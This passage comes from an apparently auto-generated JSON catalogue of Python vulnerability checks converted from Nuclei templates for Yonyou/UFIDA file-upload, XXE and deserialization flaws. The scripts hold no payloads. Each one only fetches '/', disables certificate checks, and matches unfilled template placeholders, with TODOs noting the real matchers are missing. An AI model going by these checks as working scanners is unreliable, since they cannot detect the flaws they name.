        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-filereceiveservlet-fileupload\nName: Yonyou NC FileReceiveServlet - Aribitrary File Upload\nSeverity: critical\nDescription: An unauthorized attacker can upload a file via the FileReceiveServlet endpoint.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_filereceiveservlet_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-filereceiveservlet-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou NC FileReceiveServlet - Aribitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(body_2, '{{file_content}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{file_content}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou NC FileReceiveServlet - Aribitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_filereceiveservlet_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "file-upload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_grp_u8_xxe",
        "name": "Yonyou UFIDA GRP-u8 - XXE",
        "language": "Python",
        "famille": "WebApp",
        "description": "UFIDA GRP-u8 has an XXE vulnerability. This vulnerability is caused by the application not loading external entities when parsing XML input, resulting in the loading of external SQL statements and command execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{result}}' | mot(s) '<R9PACKET>'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "num1",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num1",
            "default": "{{rand_int(800000, 999999)}}"
          },
          {
            "name": "num2",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num2",
            "default": "{{rand_int(800000, 999999)}}"
          },
          {
            "name": "result",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: result",
            "default": "{{to_number(num1)*to_number(num2)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-grp-u8-xxe\nName: Yonyou UFIDA GRP-u8 - XXE\nSeverity: critical\nDescription: UFIDA GRP-u8 has an XXE vulnerability. This vulnerability is caused by the application not loading external entities when parsing XML input, resulting in the loading of external SQL statements and command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_grp_u8_xxe:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-grp-u8-xxe\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou UFIDA GRP-u8 - XXE\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{result}}' | mot(s) '<R9PACKET>'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{result}}', '<R9PACKET>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou UFIDA GRP-u8 - XXE\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_grp_u8_xxe(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-grp-u8-xxe\nName: Yonyou UFIDA GRP-u8 - XXE\nSeverity: critical\nDescription: UFIDA GRP-u8 has an XXE vulnerability. This vulnerability is caused by the application not loading external entities when parsing XML input, resulting in the loading of external SQL statements and command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_grp_u8_xxe:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-grp-u8-xxe\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou UFIDA GRP-u8 - XXE\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{result}}' | mot(s) '<R9PACKET>'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{result}}', '<R9PACKET>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou UFIDA GRP-u8 - XXE\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_grp_u8_xxe(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "grp",
          "xxe",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_nc_accept_fileupload",
        "name": "YonYou NC Accept Upload - Arbitray File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'{{randstr_2}}')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-accept-fileupload\nName: YonYou NC Accept Upload - Arbitray File Upload\nSeverity: critical\nDescription: Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_accept_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-accept-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"YonYou NC Accept Upload - Arbitray File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'{{randstr_2}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr_2}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"YonYou NC Accept Upload - Arbitray File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_accept_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-accept-fileupload\nName: YonYou NC Accept Upload - Arbitray File Upload\nSeverity: critical\nDescription: Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_accept_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-accept-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"YonYou NC Accept Upload - Arbitray File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'{{randstr_2}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr_2}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"YonYou NC Accept Upload - Arbitray File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_accept_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "nc",
          "intrusive",
          "fileupload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_nc_dispatcher_fileupload",
        "name": "Yonyou NC ServiceDispatcher Servlet - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Yonyou NC ServiceDispatcherServlet deserialization file upload vulnerability.",
        "severity": "critical",
        "detection": "[AND] DSL: status_code_1 == 200; status_code_2 == 200 && contains(body_2,'just_a_test')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
